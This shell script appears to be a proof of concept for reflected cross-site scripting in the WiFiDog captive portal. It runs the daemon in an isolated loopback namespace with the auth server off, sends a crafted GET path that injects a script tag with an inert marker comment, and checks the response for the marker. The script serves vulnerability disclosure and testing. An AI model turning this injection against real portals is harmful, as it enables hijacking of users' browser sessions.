#!/usr/bin/env sh
set -eu

ROOT_DIR="$(CDPATH= cd -- "$(dirname "$0")/.." && pwd)"
WIFIDOG="$ROOT_DIR/src/wifidog"
CONF="$ROOT_DIR/poc/wifidog-loopback.conf"
LOG="$ROOT_DIR/poc/poc-reflected-xss-authdown.log"
RESPONSE="$ROOT_DIR/poc/poc-reflected-xss-authdown.response.html"

command -v unshare >/dev/null 2>&1 || { echo "error: unshare not found" >&2; exit 1; }
command -v python3 >/dev/null 2>&1 || { echo "error: python3 not found" >&2; exit 1; }

rm -f "$LOG" "$RESPONSE"

unshare -Urn sh -c "
set -eu
cd \"$ROOT_DIR\"
ip link set lo up
rm -f /tmp/wdctl-wifidog-poc.sock

# Intentionally do NOT start the auth server. This makes is_auth_online()==0 and triggers
# the 'Login screen unavailable' branch in http_callback_404(), which reflects tmp_url.
\"$WIFIDOG\" -f -c \"$CONF\" -d 0 >\"$LOG\" 2>&1 &
pid=\$!

for i in 1 2 3 4 5 6 7 8 9 10; do
  python3 - <<'PY' && break || true
import socket, sys
try:
    s = socket.create_connection(('127.0.0.1', 2060), timeout=0.2)
    s.close()
    sys.exit(0)
except Exception:
    sys.exit(1)
PY
  sleep 0.2
done

sleep 1

RESPONSE=\"$RESPONSE\" python3 - <<'PY'
import os
import socket

payload = \"/xss'><script>/*WIFIDOG_XSS_POC*/</script>\"
req = (
    f\"GET {payload} HTTP/1.0\\r\\n\"
    \"Host: localhost\\r\\n\"
    \"\\r\\n\"
)

s = socket.create_connection(('127.0.0.1', 2060))
s.sendall(req.encode())
chunks = []
while True:
    data = s.recv(4096)
    if not data:
        break
    chunks.append(data)
s.close()

open(os.environ['RESPONSE'], 'wb').write(b''.join(chunks))
PY

kill \"\$pid\" 2>/dev/null || true
wait \"\$pid\" || true
"

echo "Log: $LOG"
echo "Response: $RESPONSE"
if command -v rg >/dev/null 2>&1; then
  rg -n "WIFIDOG_XSS_POC" "$RESPONSE" || true
fi

